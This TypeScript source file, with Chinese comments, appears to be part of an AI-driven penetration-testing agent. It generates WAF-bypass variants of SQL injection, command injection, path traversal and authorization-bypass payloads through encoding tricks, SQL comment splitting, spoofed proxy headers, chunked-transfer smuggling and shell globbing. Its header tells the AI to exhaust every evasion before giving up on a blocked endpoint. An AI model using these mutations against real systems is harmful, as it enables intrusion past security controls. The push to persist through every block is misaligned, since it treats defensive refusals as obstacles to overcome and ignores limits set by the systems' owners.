/**
 * mutator.ts — 基于阻断反馈的自适应 Payload 变异生成器 (Adaptive Payload Mutator)
 *
 * 核心哲学（渗透作业方法论第三章 · 阻抗匹配原则）：
 *   “遇 403/WAF 阻断绝非死路，而是阻抗不匹配。必须实质穷尽编码替换、语法变形、
 *    协议走私与请求头混淆等变异维度，未穷尽变异手法前严禁转场。”
 *
 * 核心机制：
 * 1. 提供 5 级系统化变异流水线 (Level 1~5 Mutation Hierarchy)；
 * 2. 涵盖 SQL 注入、命令执行、目录遍历与通用未授权绕过；
 * 3. 供 AI 在端点处于 bypassing 状态或 sensor.ts 捕获 WAF 拦截时直接调度消费。
 */

export type MutationCategory = "sqli" | "cmdi" | "path_traversal" | "auth_bypass" | "generic";

export interface MutationCandidate {
	level: number;
	name: string;
	technique: string;
	payload: string;
	suggestedHeaders?: Record<string, string>;
	wafTarget: "keyword_filter" | "char_filter" | "layer7_rule" | "header_acl";
}

/** 字符双重 URL 编码 */
function doubleUrlEncode(str: string): string {
	return str
		.split("")
		.map((c) => {
			const code = c.charCodeAt(0).toString(16).toUpperCase();
			return code.length === 1 ? `%250${code}` : `%25${code}`;
		})
		.join("");
}

/** 十六进制转换 */
function toHexConcat(str: string): string {
	const hex = Buffer.from(str).toString("hex");
	return `0x${hex}`;
}

/** 生成系统化变异候选列表 */
export function generateMutations(
	rawPayload: string,
	category: MutationCategory = "generic",
	maxLevel = 5,
): MutationCandidate[] {
	const mutations: MutationCandidate[] = [];

	// Level 1: 字符级与编码置换 (Character / Encoding Mutation)
	if (maxLevel >= 1) {
		mutations.push({
			level: 1,
			name: "Double_URL_Encode",
			technique: "针对网关前置解析还原的二次解码",
			payload: doubleUrlEncode(rawPayload),
			wafTarget: "keyword_filter",
		});

		mutations.push({
			level: 1,
			name: "Unicode_Overlong_Variation",
			technique: "Unicode / UTF-8 宽字节超长编码欺骗",
			payload: rawPayload.replace(/'/g, "%c0%27").replace(/\//g, "%c0%af").replace(/ /g, "%c0%20"),
			wafTarget: "char_filter",
		});
	}

	// Level 2: 语法结构与内联混淆 (Syntax / Inline Comment Tampering)
	if (maxLevel >= 2) {
		if (category === "sqli" || category === "generic") {
			// 内联注释与分词打散
			const inlineCommented = rawPayload
				.replace(/\s+/g, "/**/")
				.replace(/\bSELECT\b/gi, "SE/**/LECT")
				.replace(/\bUNION\b/gi, "UN/**/ION")
				.replace(/\bWHERE\b/gi, "WH/**/ERE");

			mutations.push({
				level: 2,
				name: "SQL_Inline_Comment_Split",
				technique: "SQL 语法内联注释分词打散绕过",
				payload: inlineCommented,
				wafTarget: "keyword_filter",
			});

			mutations.push({
				level: 2,
				name: "Newline_Whitespace_Alternative",
				technique: "换行符替代空格 (%0a / %0d)",
				payload: rawPayload.replace(/\s+/g, "%0a"),
				wafTarget: "char_filter",
			});
		}

		if (category === "path_traversal") {
			mutations.push({
				level: 2,
				name: "Nested_DotDotSlash",
				technique: "双写嵌套绕过过滤 (....// 或 ..././)",
				payload: rawPayload.replace(/\.\.\//g, "....//").replace(/\.\.\\/g, "....\\\\"),
				wafTarget: "char_filter",
			});
		}
	}

	// Level 3: 请求头与网关 ACL 伪造 (Header Spoofing / IP Bypassing)
	if (maxLevel >= 3) {
		mutations.push({
			level: 3,
			name: "Header_Localhost_Spoofing",
			technique: "伪造反向代理信任头绕过网关白名单限制",
			payload: rawPayload,
			suggestedHeaders: {
				"X-Forwarded-For": "127.0.0.1",
				"X-Real-IP": "127.0.0.1",
				"X-Client-IP": "127.0.0.1",
			},
			wafTarget: "header_acl",
		});

		mutations.push({
			level: 3,
			name: "Header_Rewrite_Routing",
			technique: "针对 Nginx / Spring 网关前缀重写的路由混淆",
			payload: rawPayload,
			suggestedHeaders: {
				"X-Original-URL": rawPayload,
				"X-Rewrite-URL": rawPayload,
			},
			wafTarget: "layer7_rule",
		});
	}

	// Level 4: 传输层分块走私与 MIME 混淆 (Protocol Smuggling / Chunking)
	if (maxLevel >= 4) {
		mutations.push({
			level: 4,
			name: "Transfer_Encoding_Chunked",
			technique: "HTTP/1.1 分块传输编码走私稀释特征",
			payload: rawPayload,
			suggestedHeaders: {
				"Transfer-Encoding": "chunked",
			},
			wafTarget: "layer7_rule",
		});

		mutations.push({
			level: 4,
			name: "Multipart_Boundary_Obfuscation",
			technique: "多段表单 Boundary 引号混淆与传参折叠",
			payload: rawPayload,
			suggestedHeaders: {
				"Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryPiX",
			},
			wafTarget: "layer7_rule",
		});
	}

	// Level 5: 语义等价函数替代 (Semantic Equivalents)
	if (maxLevel >= 5) {
		if (category === "sqli") {
			mutations.push({
				level: 5,
				name: "SQL_Hex_String_Alternative",
				technique: "字符串十六进制字面量转换 (免单引号)",
				payload: toHexConcat(rawPayload),
				wafTarget: "char_filter",
			});
		}

		if (category === "cmdi") {
			mutations.push({
				level: 5,
				name: "Cmd_Wildcard_Globbing",
				technique: "Linux Shell 通配符 / 环境变量切片绕过",
				payload: rawPayload.replace(/cat/g, "/???/c?t").replace(/id/g, "/???/i?"),
				wafTarget: "keyword_filter",
			});
		}
	}

	return mutations;
}
